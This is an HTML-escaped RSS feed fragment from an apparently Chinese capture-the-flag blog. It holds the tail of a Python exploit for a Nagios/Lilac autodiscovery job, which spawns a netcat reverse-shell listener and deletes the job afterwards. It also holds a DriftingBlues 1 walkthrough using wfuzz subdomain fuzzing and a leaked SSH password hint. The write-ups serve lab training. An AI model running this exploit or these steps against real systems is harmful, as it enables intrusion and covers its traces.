+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="n"&gt;job_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;html.parser&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;completemsg&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;?id=&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;amp;amp;rev&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_success&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Discovery job successfully created with ID: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;job_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Error while creating the discovery job&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Launching listener&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_info&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Spawning netcat listener:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;nc_command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/usr/bin/nc -lnvp&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; -s &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nc_command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Removing job&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;baseurl&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/lilac/autodiscovery.php?id=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;job_id&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;amp;delete=1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user-agent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;useragent&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;auth_req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Removed Job&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_info&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Job &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;job_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; removed&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Error while removing the job&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功提权成功&lt;/p&gt;</description></item><item><title>DriftingBlues 1</title><link>https://luxuryzcx.github.io/posts/driftingblues-1/</link><pubDate>Mon, 15 Jun 2026 20:16:14 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/driftingblues-1/</guid><description>&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301191826590.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;访问源代码有一串base64的编码&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301192517573.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;解码 /noteforkingfish.txt&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301193205989.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+
+发现了ook编码&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301193236535.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;解码看看&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301193537623.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;发现需要将 host 域名给放进去&lt;/p&gt;
+&lt;p&gt;my man, i know you are new but you should know how to use host file to reach our secret location. -eric&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301194037359.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+
+已经添加进去&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301194617195.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后进行枚举子域名 发现一个test的域名&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wfuzz -c -u &amp;#39;driftingblues.box&amp;#39; -H &amp;#34;Host:FUZZ.driftingblues.box&amp;#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 570
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301201322321.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;User-agent: * Disallow: /ssh_cred.txt Allow: /never Allow: /never/gonna Allow: /never/gonna/give Allow: /never/gonna/give/up&lt;/p&gt;
+&lt;p&gt;然后访问里面的 /ssh_cred.txt&lt;/p&gt;
+&lt;p&gt;we can use ssh password in case of emergency. it was &amp;ldquo;1mw4ckyyucky&amp;rdquo;. sheryl once told me that she added a number to the end of the password. -db&lt;/p&gt;</description></item></channel></rss>
